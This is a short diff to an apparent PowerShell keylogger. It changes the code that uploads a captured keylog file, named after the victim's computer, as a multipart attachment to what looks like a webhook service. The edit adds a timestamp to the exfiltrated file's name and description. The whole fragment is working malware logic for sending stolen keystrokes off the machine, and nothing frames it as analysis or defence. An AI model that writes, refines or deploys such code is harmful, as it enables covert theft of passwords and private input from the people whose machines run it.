@@ -86,6 +86,7 @@ Do{
                 $fileContent =  [System.Text.Encoding]::GetEncoding("UTF-8").GetString($fileBytes);
                 $boundary = [System.Guid]::NewGuid().ToString();
                 $LF = "`r`n";
+                $time = Get-Date -Format "ddMMyyyyHHmm";
 
                 $data = @{
                     "username" = $env:COMPUTERNAME;
@@ -93,8 +94,8 @@ Do{
                     "attachments" = @(
                         @{
                             "id" = 0;
-                            "description" = "$env:COMPUTERNAME keylog";
-                            "filename" = "$env:COMPUTERNAME-keylog.txt";
+                            "description" = "Keylog $env:COMPUTERNAME $time";
+                            "filename" = "Keylog-$env:COMPUTERNAME-$time.txt";
                         }
                     )
                 } | ConvertTo-JSON;
@@ -105,7 +106,7 @@ Do{
                     "Content-Type: application/json$LF",
                     $data,
                     "--$boundary",
-                    "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$env:COMPUTERNAME-keylog.txt`"",
+                    "Content-Disposition: form-data; name=`"files[0]`"; filename=`"Keylog-$env:COMPUTERNAME-$time.txt`"",
                     "Content-Type: text/plain$LF",
                     $fileContent,
                     "--$boundary--$LF"
